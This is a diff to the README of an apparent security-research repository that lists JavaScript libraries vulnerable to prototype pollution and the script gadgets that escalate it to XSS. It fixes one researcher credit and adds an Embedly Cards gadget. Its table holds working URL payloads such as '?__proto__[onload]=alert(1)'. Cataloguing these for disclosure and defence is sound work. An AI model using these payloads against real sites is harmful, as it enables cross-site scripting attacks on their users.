@@ -21,7 +21,7 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [jquery-deparam](/pp/jquery-deparam.md)                           | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [MooTools More](/pp/mootools-more.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [Swiftype Site Search (**Fixed**)](/pp/swiftype-site-search.md)   | `#__proto__[test]=test`                                                  |                                             | [s1r1us](https://twitter.com/S1r1u5_)            |
-| [CanJS deparam](/pp/canjs-deparam.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [iamnoooob](https://twitter.com/iamnoooob)       |
+| [CanJS deparam](/pp/canjs-deparam.md)                             | `?__proto__[test]=test`<br>`?constructor[prototype][test]=test`          |                                             | [Rahul Maini](https://twitter.com/iamnoooob)     |
 
 ## Script Gadgets
 
@@ -45,3 +45,4 @@ In this repository, I am trying to collect examples of libraries that are vulner
 | [Marionette.js / Backbone.js](/gadgets/marionette.md)   | `?__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)`   | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
 | [Adobe Dynamic Tag Management](/gadgets/adobe-dtm.md)   | `?__proto__[src]=data:,alert(1)//`                                            | XSS               |                                                   | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
 | [Swiftype Site Search](/gadgets/swiftype-site-search.md)| `?__proto__[xxx]=alert(1)`                                                    | XSS               |                                                   | [s1r1us](https://twitter.com/S1r1u5_)               |
+| [Embedly Cards](/gadgets/embedly.md)                    | `?__proto__[onload]=alert(1)`                                                 | XSS               |                                                   | [Guilherme Keerok](https://twitter.com/k33r0k)               |
